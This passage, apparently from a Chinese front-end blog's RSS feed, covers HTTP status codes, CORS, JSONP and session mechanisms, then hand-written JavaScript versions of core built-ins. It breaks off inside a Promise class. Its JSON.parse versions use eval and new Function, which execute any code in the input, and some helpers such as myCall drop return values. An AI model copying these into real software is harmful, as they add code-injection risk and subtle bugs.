<li>常见状态码。</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">Code</th>
<th>常见原因</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">200</td>
<td>请求成功</td>
</tr>
<tr>
<td style="text-align:center">204</td>
<td>无实体内容（Body）</td>
</tr>
<tr>
<td style="text-align:center">206</td>
<td>分块下载、断点续传（必须包含 Content-Range）</td>
</tr>
<tr>
<td style="text-align:center">301</td>
<td>永久重定向（浏览器默认会做缓存优化）</td>
</tr>
<tr>
<td style="text-align:center">302</td>
<td>临时重定向（只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的）</td>
</tr>
<tr>
<td style="text-align:center">304</td>
<td>命中协商缓存</td>
</tr>
<tr>
<td style="text-align:center">307</td>
<td>302 升级版（可以确保请求方法和消息主体不会发生变化）</td>
</tr>
<tr>
<td style="text-align:center">308</td>
<td>301 升级版（可以确保请求方法和消息主体不会发生变化）</td>
</tr>
<tr>
<td style="text-align:center">400</td>
<td>可能是请求参数有误</td>
</tr>
<tr>
<td style="text-align:center">401</td>
<td>身份验证失败（无权限）</td>
</tr>
<tr>
<td style="text-align:center">403</td>
<td>禁止访问</td>
</tr>
<tr>
<td style="text-align:center">404</td>
<td>资源未找到</td>
</tr>
<tr>
<td style="text-align:center">405</td>
<td>请求方法错误</td>
</tr>
<tr>
<td style="text-align:center">500</td>
<td>服务器错误</td>
</tr>
<tr>
<td style="text-align:center">502</td>
<td>网关错误</td>
</tr>
<tr>
<td style="text-align:center">503</td>
<td>服务器繁忙</td>
</tr>
<tr>
<td style="text-align:center">504</td>
<td>网关超时</td>
</tr>
</tbody>
</table>
<ul>
<li>HTTP</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">特点</th>
<th>概括</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">无状态</td>
<td>每一次请求都是独立的，请求结束不会记录连接的任何信息，同时也减少了网络开销 。</td>
</tr>
<tr>
<td style="text-align:center">明文传输</td>
<td>报文（主要指头部）使用文本形式的数据，利用路由器等中转设备，可从中获取数据、串改数据。</td>
</tr>
<tr>
<td style="text-align:center">串行连接</td>
<td>HTTP 有无连接的特性，即每次连接只能处理一个请求，收到响应后立即断开连接。</td>
</tr>
<tr>
<td style="text-align:center">持久连接</td>
<td>同一域名下的 HTTP 请求，只要两端都没有提出断开连接，则持久保持 TCP 连接状态，其他请求可以复用这个连接通道（HTTP/1.1 默认是持久连接）。持久连接采用阻塞模式：下次请求必须等到上次响应返回后才能发起，也就是著名的队头阻塞。</td>
</tr>
<tr>
<td style="text-align:center">管道化持久连接</td>
<td>管道化则可以不用等待响应返回而发送下个请求并按顺序返回响应，目前没有现代浏览器默认启用这个特性。依然存在队头阻塞问题。</td>
</tr>
<tr>
<td style="text-align:center">并发连接</td>
<td>对于一个域名允许分配多个长连接，那么相当于增加了任务队列，不至于一个队伍的任务阻塞其它所有任务。比较常用的并发连接数已经增加到 6 条，如果尝试大于这个数字，就有触发服务器 DoS 保护的风险。可以使用域名分片技术，建立更多的连接。HTTP/2 拥有多路复用特点，不需要依赖 TCP 连接实现多流并行了，在 HTTP/2 中同域名下的通信都在单个连接上完成。</td>
</tr>
<tr>
<td style="text-align:center">头部压缩（HTTP/2）</td>
<td>使用 HPACK 算法对请求头进行压缩，在服务器与客户端建立头部字段哈希表，以及对整数和字符串使用哈夫曼编码（废除了起始行的概念，转换为头部字段）。</td>
</tr>
<tr>
<td style="text-align:center">多路复用（HTTP/2）</td>
<td>HTTP/2 将报文换成二进制格式，Headers 帧存放头部字段，Data 帧存放请求体数据。分帧后就不是一个个完整的 HTTP 请求报文了，而是一堆乱序的二进制帧，二进制帧不存在先后关系，也就不存在队头阻塞的问题了。这种二进制帧的双向传输的序列，也叫做流（Stream）。多路复用就是在一个 TCP 连接中可以存在多条流，即可以发送多个请求，服务端通过帧中的 Stream ID 重新排序还原请求。</td>
</tr>
</tbody>
</table>
<ul>
<li>HTTPS 特点：密文传输、报文完整性保护、第三方机构身份认证，同时也增加了网络开销。</li>
</ul>
<div><p>提示</p>
<p>主流的浏览器都公开只支持加密的 HTTP/2</p>
<img :src="$withBase('/images/Network/HTTP.png')" loading="lazy">
</div>
<ul>
<li>
<p><a href="https://juejin.cn/post/6844904100035821575" target="_blank" rel="noopener noreferrer">（建议精读）HTTP 灵魂之问，巩固你的 HTTP 知识体系 - 神三元</a></p>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status" target="_blank" rel="noopener noreferrer">HTTP 响应代码 - MDN</a></p>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x" target="_blank" rel="noopener noreferrer">HTTP/1.x 的连接管理 - MDN</a></p>
</li>
</ul>
<h2 id="_3-cors"> 3. CORS</h2>
<ul>
<li>
<p>浏览器向服务器发送请求，会自动加上 origin 请求头，如果响应头中 Access-Control-Allow-Origin 不为 * 或不为 origin 字段指明的域名，浏览器就会拦截响应数据，报出跨域错误。</p>
</li>
<li>
<p>CORS 是跨域 AJAX 请求的根本解决方法，实现 CORS 通信的关键是服务器，只要服务器实现了 CORS 接口，就可以跨域通信。</p>
</li>
<li>
<p>CORS 请求分为两类：简单请求和非简单请求。</p>
<blockquote>
<ol>
<li>简单请求：当请求是 GET、HEAD、POST 方法并且没有任何自定义 Header 字段时，一般来说就是个简单请求（<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82" target="_blank" rel="noopener noreferrer">简单请求 - MDN</a>）。</li>
<li>非简单请求（需预检请求）：除上述简单请求外均为非简单请求。须先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。预检请求可以避免跨域请求对服务器的用户数据产生未预期的影响。</li>
</ol>
</blockquote>
</li>
<li>
<p>跨域请求携带 Cookie 条件：</p>
<blockquote>
<ol>
<li>xhr.withCredentials 为 true 或 fetch 配置 credentials 为 include</li>
<li>网站开启 https 并将 Cookie 的 Secure 属性设置为 true</li>
<li>Cookie 的 SameSite 属性设置为 None</li>
<li>响应头 Access-Control-Allow-Origin 设置为具体的 origin，不能设置为 *</li>
<li>响应头 Access-Control-Allow-Credentials 设置为 true</li>
</ol>
</blockquote>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS" target="_blank" rel="noopener noreferrer">跨源资源共享（CORS） - MDN</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6856556746706518024" target="_blank" rel="noopener noreferrer">15 张精美动图全面讲解 CORS - 卤蛋实验室</a></p>
</li>
</ul>
<h2 id="_4-jsonp"> 4. JSONP</h2>
<ul>
<li>
<p>JSONP 利用了 script 标签不会进行同源检测的特点。</p>
</li>
<li>
<p>前端定义一个回调函数，形参为要接收的数据，将回调函数名称通过 URL 查询参数的 callback 字段（前后端业内默认约定，也可约定其他字段）传递到后端。</p>
<blockquote>
<p><code>https://www.coderljw.ga/?callback=foo</code>（前端回调函数名称为 <code>foo</code>）</p>
</blockquote>
</li>
<li>
<p>后端接收到 callback 字段的值后，将数据通过实参传入函数，返回前端定义的回调函数执行文本。浏览器解析到 JSONP 的 script 标签，就会执行这个回调函数，从而获取到数据。</p>
<blockquote>
<p><code>send(`foo(${JSON.stringify(Matrix)})`)</code>（后端返回函数 <code>foo(Matrix)</code> 执行脚本，script 标签解析执行后，前端获得 <code>Matrix</code>）</p>
</blockquote>
</li>
</ul>
<div><p>注意</p>
<p>JSONP 的 script 标签要在用户定义回调函数的 script 标签下方 --&gt; 默认的 script 标签依次加载</p>
</div>
<h2 id="_5-cookie、session、token、jwt"> 5. Cookie、Session、Token、JWT</h2>
<ul>
<li>HTTP 是无状态的，Cookie、Session、Token、JWT（JSON Web Token）可以维持前后端会话状态。</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">方式</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Cookie</td>
<td>1. 存储在客户端（限 4k），向服务器发送请求时会自动携带<br/>2. 限 Web 项目使用、默认不可跨域、小心 XSS/CSRF 攻击<br/>3. 可通过设置 withCredential/credentials 跨域请求携带 Cookie<br/>4. 设置 HttpOnly/SameSite 可防止 XSS/CSRF 攻击</td>
</tr>
<tr>
<td style="text-align:center">Session</td>
<td>1. 基于 Cookie 实现，Session 存储在服务器端，SessionId 会被存储到客户端的 Cookie 中<br/>2. 须查询数据库、占用服务器资源、要考虑分布式问题</td>
</tr>
<tr>
<td style="text-align:center">Token</td>
<td>1. 简单组成：uid.time.sign（ID.失效时间.签名）<br/>2. 服务器端无状态化，支持 Web、APP 等项目，安全性较高<br/>3. 须查询数据库</td>
</tr>
<tr>
<td style="text-align:center">JWT</td>
<td>1. 一种基于 Token 的开放标准<br/>2. 组成：Header.Payload.Signature（头部.负载.签名）<br/>3. 将用户信息存储于 Payload，不必查询数据库</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><a href="https://juejin.cn/post/6844904034181070861" target="_blank" rel="noopener noreferrer">傻傻分不清之 Cookie、Session、Token、JWT - 秋天不落叶</a></p>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener noreferrer">HTTP Cookie - MDN</a></p>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/withCredentials" target="_blank" rel="noopener noreferrer">XMLHttpRequest.withCredentials - MDN</a></p>
</li>
<li>
<p><a href="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" target="_blank" rel="noopener noreferrer">Cookie 的 SameSite 属性 - 阮一峰</a></p>
</li>
<li>
<p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener noreferrer">JSON Web Token 入门教程 - 阮一峰</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>手搓螺旋丸</title>
      <link>https://www.matrixtheone.ga/web/memo/Rasengan/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Rasengan/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">手搓螺旋丸</source>
      <category>手写代码</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-object-create"> 1. Object.create</h2>
<ul>
<li>2006 年，Douglas Crockford 写了一篇文章：<a href="https://www.crockford.com/javascript/prototypal.html" target="_blank" rel="noopener noreferrer">《JavaScript 中的原型式继承》</a>。</li>
</ul>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_2-new"> 2. new</h2>
<div><pre><code><span>function</span> <span>_new</span><span>(</span><span>Fn<span>,</span> <span>...</span>args</span><span>)</span> <span>{</span>
  <span>const</span> obj <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Fn</span><span>.</span>prototype<span>)</span>
  <span>Fn</span><span>.</span><span>apply</span><span>(</span>obj<span>,</span> args<span>)</span>
  <span>return</span> obj
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_3-instanceof"> 3. instanceof</h2>
<div><pre><code><span>function</span> <span>_instanceof</span><span>(</span><span>left<span>,</span> right</span><span>)</span> <span>{</span>
  <span>let</span> proto <span>=</span> Object<span>.</span><span>getPrototypeOf</span><span>(</span>left<span>)</span><span>,</span>
    prototype <span>=</span> right<span>.</span>prototype

  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>proto<span>)</span> <span>return</span> <span>false</span>
    <span>if</span> <span>(</span>proto <span>===</span> prototype<span>)</span> <span>return</span> <span>true</span>
    proto <span>=</span> Object<span>.</span><span>getPrototypeOf</span><span>(</span>proto<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_4-call、apply、bind"> 4. call、apply、bind</h2>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>myCall</span> <span>=</span> <span>function</span> <span>(</span><span>context <span>=</span> window<span>,</span> <span>...</span>args</span><span>)</span> <span>{</span>
  <span>const</span> fn <span>=</span> <span>Symbol</span><span>(</span><span>'fn'</span><span>)</span>
  context<span>[</span>fn<span>]</span> <span>=</span> <span>this</span>
  context<span>[</span>fn<span>]</span><span>(</span><span>...</span>args<span>)</span>
  <span>delete</span> context<span>[</span>fn<span>]</span>
<span>}</span>

<span>Function</span><span>.</span>prototype<span>.</span><span>myApply</span> <span>=</span> <span>function</span> <span>(</span><span>context <span>=</span> window<span>,</span> args <span>=</span> <span>[</span><span>]</span></span><span>)</span> <span>{</span>
  <span>const</span> fn <span>=</span> <span>Symbol</span><span>(</span><span>'fn'</span><span>)</span>
  context<span>[</span>fn<span>]</span> <span>=</span> <span>this</span>
  context<span>[</span>fn<span>]</span><span>(</span><span>...</span>args<span>)</span>
  <span>delete</span> context<span>[</span>fn<span>]</span>
<span>}</span>

<span>Function</span><span>.</span>prototype<span>.</span><span>myBind</span> <span>=</span> <span>function</span> <span>(</span><span>context<span>,</span> <span>...</span>outerArgs</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span><span>...</span>innerArgs</span><span>)</span> <span>=></span> <span>this</span><span>.</span><span>myApply</span><span>(</span>context<span>,</span> <span>[</span><span>...</span>outerArgs<span>,</span> <span>...</span>innerArgs<span>]</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_5-clone"> 5. Clone</h2>
<div><pre><code><span>// 类型检测</span>
<span>const</span> <span>detectionType</span> <span>=</span> <span>value</span> <span>=></span>
  <span>typeof</span> value <span>===</span> <span>'object'</span>
    <span>?</span> <span>{</span><span>}</span><span>.</span><span>toString</span><span>.</span><span>call</span><span>(</span>value<span>)</span><span>.</span><span>slice</span><span>(</span><span>8</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span>
    <span>:</span> <span>typeof</span> value

<span>// 浅克隆</span>
<span>function</span> <span>shallowClone</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>const</span> type <span>=</span> <span>detectionType</span><span>(</span>obj<span>)</span><span>,</span>
    Ctor <span>=</span> obj<span>.</span>constructor<span>,</span>
    typeMap <span>=</span> <span>new</span> <span>Map</span><span>(</span>
      Object<span>.</span><span>entries</span><span>(</span><span>{</span>
        <span>[</span><span>[</span><span>'symbol'</span><span>,</span> <span>'bigint'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>Object</span><span>(</span>obj<span>)</span><span>,</span>
        <span>[</span><span>[</span><span>'regexp'</span><span>,</span> <span>'date'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>new</span> <span>Ctor</span><span>(</span>obj<span>)</span><span>,</span>
        <span>[</span><span>[</span><span>'error'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>new</span> <span>Ctor</span><span>(</span>obj<span>.</span>message<span>)</span><span>,</span>
        <span>[</span><span>[</span><span>'function'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>{</span>
          <span>return</span> <span>function</span> <span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
            <span>return</span> <span>obj</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span>
          <span>}</span>
        <span>}</span><span>,</span>
        <span>[</span><span>[</span><span>'object'</span><span>,</span> <span>'array'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>{</span>
          <span>const</span> keys <span>=</span> <span>[</span>
              <span>...</span>Object<span>.</span><span>keys</span><span>(</span>obj<span>)</span><span>,</span>
              <span>...</span>Object<span>.</span><span>getOwnPropertySymbols</span><span>(</span>obj<span>)</span><span>,</span>
            <span>]</span><span>,</span>
            result <span>=</span> <span>new</span> <span>Ctor</span><span>(</span><span>)</span>
          keys<span>.</span><span>forEach</span><span>(</span><span>key</span> <span>=></span> <span>(</span>result<span>[</span>key<span>]</span> <span>=</span> obj<span>[</span>key<span>]</span><span>)</span><span>)</span>
          <span>return</span> result
        <span>}</span><span>,</span>
        <span>[</span><span>[</span><span>'set'</span><span>,</span> <span>'map'</span><span>]</span><span>]</span><span>:</span> <span>type</span> <span>=></span> <span>{</span>
          <span>const</span> result <span>=</span> <span>new</span> <span>Ctor</span><span>(</span><span>)</span>
          <span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> obj<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            type <span>===</span> <span>'set'</span> <span>?</span> result<span>.</span><span>add</span><span>(</span>value<span>)</span> <span>:</span> result<span>.</span><span>set</span><span>(</span>key<span>,</span> value<span>)</span>
          <span>}</span>
          <span>return</span> result
        <span>}</span><span>,</span>
      <span>}</span><span>)</span>
    <span>)</span>

  <span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> typeMap<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key<span>.</span><span>includes</span><span>(</span>type<span>)</span><span>)</span> <span>return</span> <span>value</span><span>(</span>type<span>)</span>
  <span>}</span>

  <span>return</span> obj
<span>}</span>

<span>// 深克隆</span>
<span>function</span> <span>deepClone</span><span>(</span>obj<span>,</span> cache <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span><span>)</span> <span>{</span>
  <span>const</span> type <span>=</span> <span>detectionType</span><span>(</span>obj<span>)</span><span>,</span>
    Ctor <span>=</span> obj<span>.</span>constructor

  <span>if</span> <span>(</span><span>!</span><span><span>/</span><span>^(object|array|set|map)$</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span>type<span>)</span><span>)</span> <span>return</span> <span>shallowClone</span><span>(</span>obj<span>)</span>

  <span>// 防止循环引用</span>
  <span>if</span> <span>(</span>cache<span>.</span><span>has</span><span>(</span>obj<span>)</span><span>)</span> <span>return</span> obj
  cache<span>.</span><span>add</span><span>(</span>obj<span>)</span>

  <span>const</span> result <span>=</span> <span>new</span> <span>Ctor</span><span>(</span><span>)</span>
  <span>if</span> <span>(</span><span><span>/</span><span>^(object|array)$</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span>type<span>)</span><span>)</span> <span>{</span>
    <span>const</span> keys <span>=</span> <span>[</span><span>...</span>Object<span>.</span><span>keys</span><span>(</span>obj<span>)</span><span>,</span> <span>...</span>Object<span>.</span><span>getOwnPropertySymbols</span><span>(</span>obj<span>)</span><span>]</span>
    keys<span>.</span><span>forEach</span><span>(</span><span>key</span> <span>=></span> <span>(</span>result<span>[</span>key<span>]</span> <span>=</span> <span>deepClone</span><span>(</span>obj<span>[</span>key<span>]</span><span>,</span> cache<span>)</span><span>)</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> obj<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      type <span>===</span> <span>'set'</span>
        <span>?</span> result<span>.</span><span>add</span><span>(</span><span>deepClone</span><span>(</span>value<span>,</span> cache<span>)</span><span>)</span>
        <span>:</span> result<span>.</span><span>set</span><span>(</span>key<span>,</span> <span>deepClone</span><span>(</span>value<span>,</span> cache<span>)</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> result
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br></div></div><h2 id="_6-json"> 6. JSON</h2>
<ul>
<li>
<p>JSON.stringify（新增 BigInt 和循环引用错误处理）。</p>
<div><pre><code><span>// 类型检测</span>
<span>const</span> <span>detectionType</span> <span>=</span> <span>value</span> <span>=></span>
  <span>typeof</span> value <span>===</span> <span>'object'</span>
    <span>?</span> <span>{</span><span>}</span><span>.</span><span>toString</span><span>.</span><span>call</span><span>(</span>value<span>)</span><span>.</span><span>slice</span><span>(</span><span>8</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span>
    <span>:</span> <span>typeof</span> value

<span>function</span> <span>jsonStringify</span><span>(</span>obj<span>,</span> cache <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span><span>)</span> <span>{</span>
  <span>const</span> type <span>=</span> <span>detectionType</span><span>(</span>obj<span>)</span><span>,</span>
    typeMap <span>=</span> <span>new</span> <span>Map</span><span>(</span>
      Object<span>.</span><span>entries</span><span>(</span><span>{</span>
        <span>[</span><span>[</span><span>'string'</span><span>]</span><span>]</span><span>:</span> <span>value</span> <span>=></span> <span><span>`</span><span>"</span><span><span>${</span>value<span>}</span></span><span>"</span><span>`</span></span><span>,</span>
        <span>[</span><span>[</span><span>'number'</span><span>,</span> <span>'boolean'</span><span>]</span><span>]</span><span>:</span> <span>value</span> <span>=></span> <span><span>`</span><span><span>${</span>value<span>}</span></span><span>`</span></span><span>,</span>
        <span>[</span><span>[</span><span>'undefined'</span><span>,</span> <span>'symbol'</span><span>,</span> <span>'function'</span><span>,</span> <span>'bigint'</span><span>]</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>void</span> <span>0</span><span>,</span>
        <span>[</span><span>[</span><span>'date'</span><span>]</span><span>]</span><span>:</span> <span>value</span> <span>=></span> <span><span>`</span><span>"</span><span><span>${</span>value<span>.</span><span>toISOString</span><span>(</span><span>)</span><span>}</span></span><span>"</span><span>`</span></span><span>,</span>
      <span>}</span><span>)</span>
    <span>)</span>

  <span>// 防止循环引用</span>
  <span>if</span> <span>(</span><span><span>/</span><span>^(array|object)$</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span>type<span>)</span> <span>&amp;&amp;</span> cache<span>.</span><span>has</span><span>(</span>obj<span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>'{}'</span>
  <span>}</span>
  cache<span>.</span><span>add</span><span>(</span>obj<span>)</span>

  <span>if</span> <span>(</span>type <span>===</span> <span>'array'</span><span>)</span> <span>{</span>
    <span>const</span> result <span>=</span> obj<span>.</span><span>map</span><span>(</span><span>value</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>
        <span><span>/</span><span>^(undefined|symbol|function|bigint)$</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span><span>detectionType</span><span>(</span>value<span>)</span><span>)</span>
      <span>)</span> <span>{</span>
        <span>return</span> <span>'null'</span>
      <span>}</span>
      <span>return</span> <span>jsonStringify</span><span>(</span>value<span>,</span> cache<span>)</span>
    <span>}</span><span>)</span>
    <span>return</span> <span><span>`</span><span>[</span><span><span>${</span>result<span>.</span><span>join</span><span>(</span><span>)</span><span>}</span></span><span>]</span><span>`</span></span>
  <span>}</span>

  <span>if</span> <span>(</span>type <span>===</span> <span>'object'</span><span>)</span> <span>{</span>
    <span>const</span> result <span>=</span> <span>{</span><span>}</span>
    <span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> Object<span>.</span><span>entries</span><span>(</span>obj<span>)</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>
        <span>!</span><span><span>/</span><span>^(undefined|symbol|function|bigint)$</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span><span>detectionType</span><span>(</span>value<span>)</span><span>)</span>
      <span>)</span> <span>{</span>
        result<span>[</span>key<span>]</span> <span>=</span> <span>jsonStringify</span><span>(</span>value<span>,</span> cache<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> <span><span>`</span><span>{</span><span><span>${</span>Object<span>.</span><span>entries</span><span>(</span>result<span>)</span>
      <span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span>{</span>
        i<span>[</span><span>0</span><span>]</span> <span>=</span> <span><span>`</span><span>"</span><span><span>${</span>i<span>[</span><span>0</span><span>]</span><span>}</span></span><span>"</span><span>`</span></span>
        <span>return</span> i<span>.</span><span>join</span><span>(</span><span>':'</span><span>)</span>
      <span>}</span><span>)</span>
      <span>.</span><span>join</span><span>(</span><span>)</span><span>}</span></span><span>}</span><span>`</span></span>
  <span>}</span>

  <span>if</span> <span>(</span><span>[</span><span>null</span><span>,</span> <span>NaN</span><span>,</span> <span>Infinity</span><span>,</span> <span>-</span><span>Infinity</span><span>]</span><span>.</span><span>some</span><span>(</span><span>i</span> <span>=></span> Object<span>.</span><span>is</span><span>(</span>i<span>,</span> obj<span>)</span><span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>'null'</span>
  <span>}</span>

  <span>let</span> match
  <span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> typeMap<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key<span>.</span><span>includes</span><span>(</span>type<span>)</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>match<span>)</span> match <span>=</span> <span>true</span>
      <span>return</span> <span>value</span><span>(</span>obj<span>)</span>
    <span>}</span>
  <span>}</span>

  <span>if</span> <span>(</span><span>!</span>match<span>)</span> <span>return</span> <span>'{}'</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br></div></div></li>
<li>
<p>JSON.parse</p>
<div><pre><code><span>// 方式一</span>
<span>function</span> <span>jsonParse</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>return</span> <span>eval</span><span>(</span><span><span>`</span><span>(</span><span><span>${</span>obj<span>}</span></span><span>)</span><span>`</span></span><span>)</span>
<span>}</span>

<span>// 方式二</span>
<span>function</span> <span>jsonParse</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Function</span><span>(</span><span><span>`</span><span>return </span><span><span>${</span>obj<span>}</span></span><span>`</span></span><span>)</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
</ul>
<h2 id="_7-promise"> 7. Promise</h2>
<div><pre><code><span>class</span> <span>MyPromise</span> <span>{</span>
  <span>static</span> <span>PENDING</span> <span>=</span> <span>'PENDING'</span>
  <span>static</span> <span>FULFILLED</span> <span>=</span> <span>'FULFILLED'</span>
  <span>static</span> <span>REJECTED</span> <span>=</span> <span>'REJECTED'</span>

  status <span>=</span> MyPromise<span>.</span><span>PENDING</span>
  value <span>=</span> <span>null</span>
  callbacks <span>=</span> <span>[</span><span>]</span>

  <span>constructor</span><span>(</span><span>executor</span><span>)</span> <span>{</span>
    <span>const</span> <span>createExeFn</span> <span>=</span> <span>(</span><span>status<span>,</span> handlerProp</span><span>)</span> <span>=></span> <span>value</span> <span>=></span> <span>{</span>
